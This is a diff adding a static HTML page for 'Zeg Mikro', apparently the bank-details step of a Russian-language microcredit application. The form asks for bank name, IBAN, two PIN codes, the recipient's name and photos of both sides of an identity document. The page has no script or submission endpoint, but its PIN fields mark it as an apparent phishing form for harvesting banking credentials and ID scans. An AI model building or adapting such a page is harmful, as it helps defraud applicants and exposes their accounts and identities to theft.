@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link rel="stylesheet" href="./css/style.css">
+  <title>Zeg Mikro</title>
+</head>
+
+<body>
+  <header>
+  </header>
+  <main>
+    <section class="micro-credit">
+      <div class="micro-credit__form-block micro-credit__form-block--step1">
+        <div class="container">
+          <div class="row">
+            <h2 class="micro-credit__mid-title">
+              Оформление заявки
+            </h2>
+            <div class="decor">
+            </div>
+          </div>
+        </div>
+        <div class="container">
+          <div class="row">
+            <div class="micro-credit__form-wrapper micro-credit__form-wrapper--main">
+              <ul class="micro-credit__form-steps">
+                <li>
+                  <div class="micro-credit__step micro-credit__step--active">1</div>
+                  <span>Линые данные</span>
+                </li>
+                <li>
+                  <div class="micro-credit__step micro-credit__step--active">2</div>
+                  <span>Адресс</span>
+                </li>
+                <li>
+                  <div class="micro-credit__step micro-credit__step--active">3</div>
+                  <span>Банковские данные</span>
+                </li>
+              </ul>
+              <form class="micro-credit__form micro-credit__form--main">
+                <div class="micro-credit__from-wrapper">
+                  <label>
+                    <span>Название банка EC*</span>
+                    <input type="text" id="bank-name-es" name="bank-name-es" class="micro-credit__form-input" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper">
+                  <label>
+                    <span>Номер счета IBAN*</span>
+                    <input type="text" id="number-iban" name="number-iban" class="micro-credit__form-input" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper">
+                  <label>
+                    <span>PIN 1*</span>
+                    <input type="text" id="pin-1" name="pin-1" class="micro-credit__form-input" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper">
+                  <label>
+                    <span>PIN 2*</span>
+                    <input type="text" id="pin-2" name="pin-2" class="micro-credit__form-input" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper">
+                  <label>
+                    <span>Имя, фамилия получателя* <span>(можно указать только ваш личный счет !!)</span></span>
+                    <input type="text" id="recipient-data" name="recipient-data" class="micro-credit__form-input" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper micro-credit__from-wrapper--file">
+                  <label>
+                    <span>Фото*<br> <span>Лицевая сторона документа*</span></span>
+                    <input type="file" id="photo-passport" name="photo-passport" class="micro-credit__form-input micro-credit__form-input--file" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper micro-credit__from-wrapper--file">
+                  <label>
+                    <span>Фото*<br> <span>Тыльная сторона документа*</span></span>
+                    <input type="file" id="photo-passport-2" name="photo-passport-2" class="micro-credit__form-input micro-credit__form-input--file" required>
+                  </label>
+                </div>
+                <div class="micro-credit__from-wrapper micro-credit__from-wrapper--agree">
+                  <label>
+                    <input type="checkbox" id="agree-input" name="agree-input" class="micro-credit__form-input micro-credit__form-input--agree" required>
+                    <span>
+                      <span>Я соглашаюсь с условиями пользования политикой конфиденциальности и обработкой личных
+                        данных.
+                      </span>
+                    </span>
+                  </label>
+                </div>
+                <div class="micro-credit__from-btns-wrapper">
+                  <a class="micro-credit__btn micro-credit__btn--transparent" type="submit">Отмена</a>
+                  <a class="micro-credit__btn micro-credit__btn--red" type="submit">Дальше</a>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+  <footer>
+  </footer>
+</body>
+
+</html>
